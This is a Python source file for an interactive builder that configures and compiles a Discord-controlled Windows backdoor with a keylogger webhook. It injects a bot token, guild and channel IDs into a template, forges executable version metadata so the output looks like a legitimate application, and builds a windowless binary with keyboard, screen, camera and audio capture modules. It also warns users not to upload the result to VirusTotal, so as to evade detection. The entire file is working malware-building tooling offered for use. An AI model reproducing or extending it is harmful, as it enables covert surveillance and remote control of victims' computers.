import os
import subprocess
from prettytable import PrettyTable
from sys import platform as OS

def clear_screen():
    if OS.startswith("linux"):
        os.system("clear")

def print_banner():
    print(r'''
                                                                         .   @@@@                     @@@@   .       
                                                                        : @@@@@@@@@                 @@@@@@@@@ :      
                                                                         @@@@@@@@@@@  :         :  @@@@@@@@@@@       
                                                                         @@@@@@@@@@@@#           #@@@@@@@@@@@@       
                                                                          @@@@@@@@@@@@           @@@@@@@@@@@@        
                                                                        . @@@@@@@@@@@@# .     : *@@@@@@@@@@@@ .      
                                                                            @@@@@@@@@@@         @@@@@@@@@@@          
                                                                            @@@@@@@@@@@      :  @@@@@@@@@@@          
                                                                             @@@@@@@@@@@       @@@@@@@@@@@           
                                                                              @@@@@@@@@@       @@@@@@@@@@            
                                                                               -@@@@@@   :   :   @@@@@@=             
                                                                                @@@        .        @@@              
                                                                                    @@@@@@@@@@@@@@@                  
                    ██████╗  █████╗ ██╗   ██╗██████╗  █████╗ ██╗   ██╗           @@@@@@@@@@@@@@@@@@@@@               
                    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗╚██╗ ██╔╝         %@@@@@@@@@@@@@@@@@@@@@@@%             
                    ██████╔╝███████║ ╚████╔╝ ██████╔╝███████║ ╚████╔╝         @@@@@@@@@@@@@@@@@@@@@@@@@@@            
                    ██╔══██╗██╔══██║  ╚██╔╝  ██╔══██╗██╔══██║  ╚██╔╝         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@           
                    ██████╔╝██║  ██║   ██║   ██████╔╝██║  ██║   ██║         @@@@.     +@@@@@@@@. @@  @@@@@@          
                    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝         @@@%       @@@@@@@@@    @@@@@@@          
                                      build by vicky aka @admin12121         @@@%        @@@@@@@@@   @@@@@@@          
                                                                            @@@@        @@@@@@@@@  @  @@@@@          
                                                                             @@@@      @@@@@@@@@+  @   @@@           
                                                                              @@@@@@@@@@@@   @@@@@@@@@@@@            
                                                                             :   @@@@@@@@@@@@@@@@@@@@@   :           
                                                                                     @@@@@@@@@@@@@                   
                                                                                    .. +@@@ @@@+ ..                  
                                                                            
''')

PAYLOAD_SETTINGS = ["Backdoor Name", "Guild ID", "Bot Token", "Channel ID", "Keylogger Webhook"]

def create_table(settings):
    table = PrettyTable(["Setting", "Value"])
    for name, value in zip(PAYLOAD_SETTINGS, settings):
        if name:
            table.add_row([name, value])
    else:
        print("[!] Please select a valid payload!\n")
    return table

def get_default_meta(app_name):
    cap = app_name.capitalize()
    low = app_name.lower()
    return [
        ("CompanyName", cap),
        ("FileDescription", f"{cap}"),
        ("ProductName", cap),
        ("InternalName", low),
        ("OriginalFilename", f"{low}.exe"),
    ]

def prompt_metadata(meta):
    print("\n[+] Enter application metadata (leave blank to keep current value):")
    for i, (field, default) in enumerate(meta):
        value = input(f"> {field} [{default}]: ").strip()
        if value:
            meta[i] = (field, value)
    print("[+] Metadata updated!\n")

def write_version_txt(meta, path="version.txt"):
    content = f"""VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0),
    prodvers=(1, 0, 0, 0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo([
      StringTable(
        '040904B0',
        [
{chr(10).join([f"          StringStruct('{k}', '{v}')," for k, v in meta])}
        ]
      )
    ]),
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

def build_backdoor(settings, meta=None):
    import shutil

    app_name = settings[0]
    if not app_name or app_name.lower() == "none":
        print("[!] Application name must be set before building.")
        return

    if meta is None:
        meta = get_default_meta(app_name)
    else:
        defaults = get_default_meta(app_name)
        meta = [(field, val if val and val != "None" else defval) for (field, val), (_, defval) in zip(meta, defaults)]

    template_path = "main.py"
    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            file = f.read()
        newfile = file.replace("{GUILD}", str(settings[1]))
        newfile = newfile.replace("{TOKEN}", str(settings[2]))
        newfile = newfile.replace("{CHANNEL}", str(settings[3]))
        newfile = newfile.replace("{KEYLOG_WEBHOOK}", str(settings[4]))
    except Exception as e:
        print(f"[!] Error reading template: {e}")
        return

    filename = f"{settings[0]}.py"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(newfile)

    write_version_txt(meta)

    py_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--icon=img/exe_file.ico",
        "--version-file=version.txt",
        "--hidden-import=discord",
        "--hidden-import=discord.ext.commands",
        "--hidden-import=discord.ext",
        "--hidden-import=discord_webhook",
        "--hidden-import=psutil",
        "--hidden-import=keyboard",
        "--hidden-import=pyautogui",
        "--hidden-import=PIL",
        "--hidden-import=win32api",
        "--hidden-import=win32con",
        "--hidden-import=win32gui",
        "--hidden-import=cv2",
        "--hidden-import=sounddevice",
        "--hidden-import=scipy",
        "--hidden-import=scipy._cyutility",
        "--hidden-import=scipy.special._cdflib",
        filename
    ]

    subprocess.call(py_cmd)
    for ext in [".py", ".spec"]:
        try:
            os.remove(settings[0] + ext)
        except FileNotFoundError:
            pass

    shutil.rmtree("build", ignore_errors=True)

    print('\n[+] The Backdoor can be found inside the "dist" directory')
    print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')


def print_help(command=None):
    if not command:
        print('''
Help Menu:
help                Show this menu
set <setting> <val> Set a value for a setting
config              Show current settings
build               Build the Discord backdoor (Windows)
exit                Exit the builder
''')
    elif command == "set":
        print('''
Help Menu:
"set <setting> <value>" Sets a value to a valid setting
Settings:
"name" - The name of the backdoor
"guild-id" - The ID of the Discord server
"bot-token" - The token of the Discord bot
"channel-id" - The ID of the Discord channel
"webhook" - The webhook for the keylogger
''')
    elif command == "config":
        print('''
Help Menu:
"config" Displays the current settings for the backdoor
''')
    elif command == "build":
        print('''
Help Menu:
"build" Builds the Discord backdoor with the current settings
Make sure to set all settings before building.
''')

def main():
    clear_screen()
    print_banner()

    settings = ["None"] * 5
    meta = get_default_meta("None")

    while True:
        try:
            command = input(f"[+] discord > ").strip()
            if not command:
                continue
            command_list = command.split()
            cmd = command_list[0].lower()

            if cmd == "exit":
                print("\n[+] Exiting!")
                break

            elif cmd == "help":
                if len(command_list) == 1:
                    print_help()
                else:
                    print_help(command_list[1].lower())

            elif cmd == "meta":
                prompt_metadata(meta)
                continue

            elif cmd == "set":
                if len(command_list) == 1:
                    for i, setting in enumerate(PAYLOAD_SETTINGS):
                        value = input(f"> {setting} : ").strip()
                        settings[i] = value
                    meta = get_default_meta(settings[0])
                    print("[+] All settings updated!\n")
                    continue
                elif len(command_list) == 6:
                    settings[:] = command_list[1:6]
                    meta = get_default_meta(settings[0])
                    print("[+] All settings updated!\n")
                    continue
                elif len(command_list) == 3:
                    setting, value = command_list[1].lower(), command_list[2]
                    setting_map =  {"name": 0, "guild-id": 1, "bot-token": 2, "channel-id": 3, "webhook": 4}
                    if setting in setting_map:
                        settings[setting_map[setting]] = value
                        if setting == "name":
                            meta = get_default_meta(value)
                        print(f"[+] {PAYLOAD_SETTINGS[setting_map[setting]]} updated!\n")
                    else:
                        print("[!] Invalid setting!\n")
                    continue
                else:
                    print("[!] Usage:\n  set <setting> <value>\n  set <name> <guild-id> <bot-token> <channel-id> <webhook>\n")
                    continue

            elif cmd == "config":
                print(f"\n{create_table(settings).get_string(title='Disctopia Backdoor Settings')}")
                print("Run 'help set' for more information\n")

            elif cmd == "clear":
                clear_screen()

            elif cmd == "build":
                if "None" in settings:
                    print("[!] Please set all settings before building.")
                    continue
                confirm = input("[?] Are you sure you want to build the backdoor? (y/n): ").strip().lower()
                if confirm == "y" or confirm == "yes":
                    print("[+] Building backdoor...")
                    build_backdoor(settings, meta)
                    break
            else:
                print("[!] Invalid command! Type 'help' for options.")

        except KeyboardInterrupt:
            print("\n\n[+] Exiting")
            break

if __name__ == "__main__":
    main()